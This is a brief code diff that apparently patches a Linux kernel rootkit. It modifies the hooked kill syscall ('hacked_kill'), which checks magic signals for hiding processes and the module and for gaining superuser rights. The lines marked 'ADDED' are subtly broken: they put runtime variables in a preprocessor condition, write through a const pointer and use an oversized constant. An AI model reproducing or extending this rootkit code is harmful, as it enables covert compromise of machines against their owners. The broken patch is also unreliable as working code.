@@ -298,16 +298,19 @@ module_hide(void)
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
-asmlinkage int
-hacked_kill(struct pt_regs *pt_regs)
-{
-#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
-	pid_t pid = (pid_t) pt_regs->di;
-	int sig = (int) pt_regs->si;
-#elif IS_ENABLED(CONFIG_ARM64)
-	pid_t pid = (pid_t) pt_regs->regs[0];
-	int sig = (int) pt_regs->regs[1];
-#endif
+	asmlinkage int
+	hacked_kill(const struct pt_regs *pt_regs)
+	{
+	#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+		pid_t pid = (pid_t) pt_regs->di;
+		int sig = (int) pt_regs->si;
+	#elif IS_ENABLED(CONFIG_ARM64)
+		pid_t pid = (pid_t) pt_regs->regs[0];
+		int sig = (int) pt_regs->regs[1];
+	#endif
+	#if (pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS))//ADDED
+		pt_regs->regs[0] = 12345678901234567890;//ADDED
+	#endif//ADDED
 #else
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
